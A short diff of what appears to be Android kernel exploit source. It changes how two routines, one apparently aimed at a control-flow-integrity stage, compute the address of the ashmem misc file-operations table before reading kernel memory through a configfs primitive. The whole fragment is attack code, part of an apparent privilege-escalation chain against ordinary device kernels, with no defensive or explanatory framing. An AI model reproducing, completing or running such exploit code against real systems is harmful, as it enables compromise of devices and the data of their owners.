@@ -107,7 +107,7 @@ void do_pselect_fake_lock_route(void) {
     return;
   }
 
-  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t misc_fops = canon_addr(ASHMEM_MISC_FOPS);
   uint64_t original_fops = canon_addr(ASHMEM_FOPS);
   uint64_t pre_fops = 0;
 
@@ -228,7 +228,7 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t misc_fops = canon_addr(ASHMEM_MISC_FOPS);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
